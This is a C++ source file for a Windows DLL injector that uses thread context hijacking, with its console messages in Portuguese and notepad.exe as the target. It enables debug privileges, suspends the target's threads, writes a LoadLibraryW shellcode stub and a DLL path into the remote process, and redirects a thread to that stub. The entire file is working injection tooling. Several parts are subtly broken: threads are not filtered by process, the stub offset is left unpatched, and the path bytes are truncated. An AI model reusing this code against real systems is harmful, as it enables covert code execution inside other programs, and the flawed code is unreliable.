#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <string>
#include <vector>

#pragma comment(lib, "Kernel32.lib")
#pragma comment(lib, "Advapi32.lib")

bool EnableDebugPrivilege()
{
    HANDLE tokenHandle = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle)) {
        std::wcerr << L"OpenProcessToken falhou. Erro: " << GetLastError() << std::endl;
        return false;
    }

    LUID luid{};
    if (!LookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &luid)) {
        std::wcerr << L"LookupPrivilegeValue falhou. Erro: " << GetLastError() << std::endl;
        CloseHandle(tokenHandle);
        return false;
    }

    TOKEN_PRIVILEGES tp{};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(tokenHandle, FALSE, &tp, sizeof(tp), nullptr, nullptr)) {
        std::wcerr << L"AdjustTokenPrivileges falhou. Erro: " << GetLastError() << std::endl;
        CloseHandle(tokenHandle);
        return false;
    }

    CloseHandle(tokenHandle);
    std::wcout << L"Debug privileges habilitados com sucesso." << std::endl;
    return true;
}

bool IsArchitectureMatching(HANDLE targetProcess)
{
    BOOL isCurrentWow64 = FALSE;
    BOOL isTargetWow64 = FALSE;

    IsWow64Process(GetCurrentProcess(), &isCurrentWow64);
    IsWow64Process(targetProcess, &isTargetWow64);

    return (isCurrentWow64 == isTargetWow64);
}

struct ThreadSnapshot {
    DWORD threadId;
    CONTEXT context;
};

std::vector<ThreadSnapshot> EnumerateThreadContexts(DWORD targetPid)
{
    std::vector<ThreadSnapshot> threads;

    std::wcout << L"\nEnumerando threads do PID " << targetPid << "..." << std::endl;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::wcerr << L"CreateToolhelp32Snapshot falhou: 0x" << std::hex << GetLastError() << std::dec << std::endl;
        return threads;
    }

    THREADENTRY32 te{};
    te.dwSize = sizeof(te);

    if (!Thread32First(snapshot, &te)) {
        std::wcerr << L"Thread32First falhou: 0x" << std::hex << GetLastError() << std::dec << std::endl;
        CloseHandle(snapshot);
        return threads;
    }

    int count = 0;
    do {
        HANDLE th = OpenThread(THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
        if (th == nullptr) continue;

        // Try to suspend to verify this thread belongs to target process
        DWORD suspendCount = SuspendThread(th);
        if (suspendCount == (DWORD)-1) {
            CloseHandle(th);
            continue;
        }
        ResumeThread(th);

        // Get context
        count++;
        CONTEXT ctx{};
        ctx.ContextFlags = CONTEXT_ALL;

        if (GetThreadContext(th, &ctx)) {
            ThreadSnapshot ts;
            ts.threadId = te.th32ThreadID;
            ts.context = ctx;
            threads.push_back(ts);
            std::wcout << L"  Thread " << count << ": TID " << te.th32ThreadID << L" RIP=0x" << std::hex << ctx.Rip << std::dec << std::endl;
        }

        CloseHandle(th);

    } while (Thread32Next(snapshot, &te));

    CloseHandle(snapshot);
    std::wcout << L"Total de threads: " << threads.size() << std::endl;

    return threads;
}

std::vector<unsigned char> GenerateContextHijackStub(
    LPVOID stackFrame,
    LPVOID loadLibraryAddr,
    const wchar_t* dllPath,
    DWORD_PTR originalRip)
{
    std::vector<unsigned char> code;

    // x64 assembly stub:
    // sub rsp, 0x28                    - align stack
    // lea rcx, [stub_end + offset]    - load DLL path into RCX
    // mov rax, loadLibraryAddr        - move LoadLibraryW address to RAX
    // call rax                         - call LoadLibraryW
    // add rsp, 0x28                   - restore stack
    // mov rax, originalRip            - move original RIP to RAX
    // jmp rax                          - jump back

    unsigned char stub[] = {
        0x48, 0x83, 0xEC, 0x28,                                    // sub rsp, 0x28
        0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,                // lea rcx, [rip+0]
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, <addr>
        0xFF, 0xD0,                                                 // call rax
        0x48, 0x83, 0xC4, 0x28,                                    // add rsp, 0x28
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, <originalRip>
        0xFF, 0xE0                                                  // jmp rax
    };

    code.insert(code.end(), stub, stub + sizeof(stub));

    // Patch LoadLibraryW address at offset 13
    DWORD_PTR addr = (DWORD_PTR)loadLibraryAddr;
    memcpy(&code[13], &addr, 8);

    // Patch original RIP at offset 26
    addr = originalRip;
    memcpy(&code[26], &addr, 8);

    // Add DLL path string at end
    for (size_t i = 0; i < wcslen(dllPath); i++) {
        code.push_back((unsigned char)dllPath[i]);
    }
    code.push_back(0);

    return code;
}

bool SetThreadContextToAddress(DWORD threadId, const void* newRip, CONTEXT& ctx)
{
    HANDLE th = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
    if (th == nullptr) {
        std::wcerr << L"OpenThread(SET_CONTEXT) falhou para TID " << threadId << std::endl;
        return false;
    }

    ctx.Rip = (DWORD_PTR)newRip;
    BOOL res = SetThreadContext(th, &ctx);

    CloseHandle(th);

    if (!res) {
        std::wcerr << L"SetThreadContext falhou para TID " << threadId << std::endl;
        return false;
    }

    std::wcout << L"  TID " << threadId << L" contexto modificado para RIP=0x" << std::hex << (DWORD_PTR)newRip << std::dec << std::endl;
    return true;
}

const wchar_t* GetFileName(const wchar_t* path)
{
    const wchar_t* fn = wcsrchr(path, L'\\');
    if (fn) return fn + 1;
    fn = wcsrchr(path, L'/');
    if (fn) return fn + 1;
    return path;
}

DWORD FindProcessId(const wchar_t* procName)
{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);

    if (!Process32FirstW(snapshot, &pe)) {
        CloseHandle(snapshot);
        return 0;
    }

    const wchar_t* targetName = GetFileName(procName);

    do {
        if (_wcsicmp(pe.szExeFile, targetName) == 0) {
            DWORD pid = pe.th32ProcessID;
            CloseHandle(snapshot);
            return pid;
        }
    } while (Process32NextW(snapshot, &pe));

    CloseHandle(snapshot);
    return 0;
}

int main()
{
    const wchar_t* targetProcess = L"notepad.exe";
    const wchar_t* dllPath = L"C:\\Users\\Max\\source\\repos\\VltChallengeDll\\x64\\Debug\\VltChallengeDll.dll";

    std::wcout << L"=== CONTEXT HIJACKING DLL INJECTOR ===" << std::endl;

    std::wcout << L"\nHabilitando debug privileges..." << std::endl;
    EnableDebugPrivilege();

    std::wcout << L"\nProcurando: " << targetProcess << std::endl;
    DWORD pid = FindProcessId(targetProcess);

    if (pid == 0) {
        std::wcerr << L"Processo nao encontrado!" << std::endl;
        return 1;
    }

    std::wcout << L"PID: " << pid << std::endl;

    if (GetFileAttributesW(dllPath) == INVALID_FILE_ATTRIBUTES) {
        std::wcerr << L"DLL nao encontrada: " << dllPath << std::endl;
        return 1;
    }

    HANDLE proc = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_SUSPEND_RESUME,
        FALSE, pid);

    if (proc == nullptr) {
        std::wcerr << L"OpenProcess falhou. Erro: " << GetLastError() << std::endl;
        return 1;
    }

    std::wcout << L"Processo aberto OK." << std::endl;

    if (!IsArchitectureMatching(proc)) {
        std::wcerr << L"Arquitetura incompativel!" << std::endl;
        CloseHandle(proc);
        return 1;
    }

    // Enumerate threads and get contexts
    auto threads = EnumerateThreadContexts(pid);

    if (threads.empty()) {
        std::wcerr << L"Nenhuma thread encontrada!" << std::endl;
        CloseHandle(proc);
        return 1;
    }

    std::wcout << L"\n=== CONTEXT HIJACKING ===" << std::endl;

    // Suspend all threads
    std::wcout << L"Suspendendo threads..." << std::endl;
    std::vector<std::pair<DWORD, HANDLE>> suspendedThreads;

    for (auto& t : threads) {
        HANDLE th = OpenThread(THREAD_SUSPEND_RESUME, FALSE, t.threadId);
        if (th != nullptr) {
            DWORD sc = SuspendThread(th);
            if (sc != (DWORD)-1) {
                suspendedThreads.push_back({t.threadId, th});
                std::wcout << L"  TID " << t.threadId << L" suspensa." << std::endl;
            } else {
                CloseHandle(th);
            }
        }
    }

    if (suspendedThreads.empty()) {
        std::wcerr << L"Falha ao suspender threads!" << std::endl;
        CloseHandle(proc);
        return 1;
    }

    // Select first thread for hijacking
    ThreadSnapshot& hijack = threads[0];
    std::wcout << L"\nThread para hijacking: TID " << hijack.threadId << std::endl;
    std::wcout << L"  RIP original: 0x" << std::hex << hijack.context.Rip << std::dec << std::endl;

    // Allocate memory for DLL path
    std::wcout << L"\nAlocando memoria..." << std::endl;
    SIZE_T dllPathLen = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    LPVOID dllPathMem = VirtualAllocEx(proc, nullptr, dllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (dllPathMem == nullptr) {
        std::wcerr << L"VirtualAllocEx (dllpath) falhou!" << std::endl;
        for (auto& st : suspendedThreads) ResumeThread(st.second);
        CloseHandle(proc);
        return 1;
    }

    std::wcout << L"  DLL path: 0x" << std::hex << (DWORD_PTR)dllPathMem << std::dec << std::endl;

    // Write DLL path
    SIZE_T written = 0;
    if (!WriteProcessMemory(proc, dllPathMem, (LPVOID)dllPath, dllPathLen, &written)) {
        std::wcerr << L"WriteProcessMemory falhou!" << std::endl;
        VirtualFreeEx(proc, dllPathMem, 0, MEM_RELEASE);
        for (auto& st : suspendedThreads) ResumeThread(st.second);
        CloseHandle(proc);
        return 1;
    }

    // Get LoadLibraryW address
    HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
    FARPROC loadLibAddr = GetProcAddress(k32, "LoadLibraryW");

    std::wcout << L"  LoadLibraryW: 0x" << std::hex << (DWORD_PTR)loadLibAddr << std::dec << std::endl;

    // Generate stub
    std::wcout << L"\nGerando stub..." << std::endl;
    auto stub = GenerateContextHijackStub(nullptr, loadLibAddr, dllPath, hijack.context.Rip);
    std::wcout << L"  Stub size: " << stub.size() << " bytes" << std::endl;

    // Allocate stub memory
    LPVOID stubMem = VirtualAllocEx(proc, nullptr, stub.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (stubMem == nullptr) {
        std::wcerr << L"VirtualAllocEx (stub) falhou!" << std::endl;
        VirtualFreeEx(proc, dllPathMem, 0, MEM_RELEASE);
        for (auto& st : suspendedThreads) ResumeThread(st.second);
        CloseHandle(proc);
        return 1;
    }

    std::wcout << L"  Stub addr: 0x" << std::hex << (DWORD_PTR)stubMem << std::dec << std::endl;

    // Write stub
    if (!WriteProcessMemory(proc, stubMem, stub.data(), stub.size(), &written)) {
        std::wcerr << L"WriteProcessMemory (stub) falhou!" << std::endl;
        VirtualFreeEx(proc, stubMem, 0, MEM_RELEASE);
        VirtualFreeEx(proc, dllPathMem, 0, MEM_RELEASE);
        for (auto& st : suspendedThreads) ResumeThread(st.second);
        CloseHandle(proc);
        return 1;
    }

    // Modify thread context
    std::wcout << L"\nModificando contexto..." << std::endl;
    if (!SetThreadContextToAddress(hijack.threadId, stubMem, hijack.context)) {
        std::wcerr << L"SetThreadContext falhou!" << std::endl;
        VirtualFreeEx(proc, stubMem, 0, MEM_RELEASE);
        VirtualFreeEx(proc, dllPathMem, 0, MEM_RELEASE);
        for (auto& st : suspendedThreads) ResumeThread(st.second);
        CloseHandle(proc);
        return 1;
    }

    // Resume threads
    std::wcout << L"\nRetomando threads..." << std::endl;
    for (auto& st : suspendedThreads) {
        ResumeThread(st.second);
        CloseHandle(st.second);
        std::wcout << L"  TID " << st.first << L" retomada." << std::endl;
    }

    // Cleanup
    std::wcout << L"\nLimpando..." << std::endl;
    Sleep(500); // Let injection complete
    VirtualFreeEx(proc, stubMem, 0, MEM_RELEASE);
    VirtualFreeEx(proc, dllPathMem, 0, MEM_RELEASE);
    CloseHandle(proc);

    std::wcout << L"\n=== INJECAO CONCLUIDA ===" << std::endl;
    return 0;
}
